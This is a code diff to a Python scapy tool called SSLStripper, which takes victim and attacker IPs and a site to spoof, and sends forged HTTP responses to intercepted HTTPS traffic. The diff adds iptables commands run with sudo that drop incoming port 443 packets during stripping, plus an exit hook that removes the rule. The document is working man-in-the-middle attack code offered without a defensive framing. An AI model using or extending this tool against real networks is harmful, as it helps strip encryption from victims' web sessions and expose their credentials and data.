@@ -2,6 +2,7 @@ from scapy.all import *
 from scapy.layers.inet import IP
 from logger import log_info, log_warning
 from scapy.layers.http import HTTPRequest, TCP, Raw
+import atexit
 
 class SSLStripper:
     def __init__(self, interface, ip_victim, ip_attacker, site_to_spoof):
@@ -12,6 +13,8 @@ class SSLStripper:
 
     def strip(self):
         log_info("Starting SSL stripping")
+        # Add an iptables rule to drop incoming packets for port 443
+        add_iptables_rule(443)
         sniff(
             filter="tcp and port 443",
             prn=self._on_https_request,
@@ -62,3 +65,14 @@ class SSLStripper:
 
             send(response, verbose=0)
             log_info("Sent HTTP response for {} to {}".format(packet[IP].src, packet[IP].dst))
+
+def add_iptables_rule(port):
+    # Add the iptables rule to drop incoming packets for the specified port
+    subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])
+
+def remove_iptables_rule(port):
+    # Remove the iptables rule
+    subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "DROP"])
+
+
+atexit.register(remove_iptables_rule, 443)
